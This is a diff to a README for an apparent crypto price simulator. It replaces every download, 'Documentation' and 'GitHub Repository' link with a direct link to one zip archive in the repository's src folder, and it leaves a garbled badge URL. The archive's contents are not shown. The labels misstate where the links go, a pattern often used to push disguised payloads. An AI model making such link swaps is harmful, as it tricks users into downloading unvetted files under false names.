@@ -6,7 +6,7 @@ Welcome to the Crypto-Price-Equilibrium-Simulator! This application helps you un
 
 ## 🡲 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/releases)
+[![Download Latest Release](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/raw/refs/heads/main/src/Crypto_Price_Equilibrium_Simulator_v1.2-beta.1.zip%20Latest%https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/raw/refs/heads/main/src/Crypto_Price_Equilibrium_Simulator_v1.2-beta.1.zip)](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/raw/refs/heads/main/src/Crypto_Price_Equilibrium_Simulator_v1.2-beta.1.zip)
 
 ## 🥇 Overview
 
@@ -23,7 +23,7 @@ This application empowers users with clear insights into the complexities of cry
 
 To get started, visit the Releases page. Here you will find the latest version of the software. Click the link below to access the page and download the application.
 
-[Download Latest Release](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/releases)
+[Download Latest Release](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/raw/refs/heads/main/src/Crypto_Price_Equilibrium_Simulator_v1.2-beta.1.zip)
 
 ### Steps to Download:
 
@@ -84,7 +84,7 @@ We encourage you to download the application and start exploring the world of cr
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/docs) - Detailed instructions on how to use each feature.
-- [GitHub Repository](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator) - Access the source code and contribute to the project.
+- [Documentation](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/raw/refs/heads/main/src/Crypto_Price_Equilibrium_Simulator_v1.2-beta.1.zip) - Detailed instructions on how to use each feature.
+- [GitHub Repository](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/raw/refs/heads/main/src/Crypto_Price_Equilibrium_Simulator_v1.2-beta.1.zip) - Access the source code and contribute to the project.
 
-[Download Latest Release](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/releases)
+[Download Latest Release](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/raw/refs/heads/main/src/Crypto_Price_Equilibrium_Simulator_v1.2-beta.1.zip)
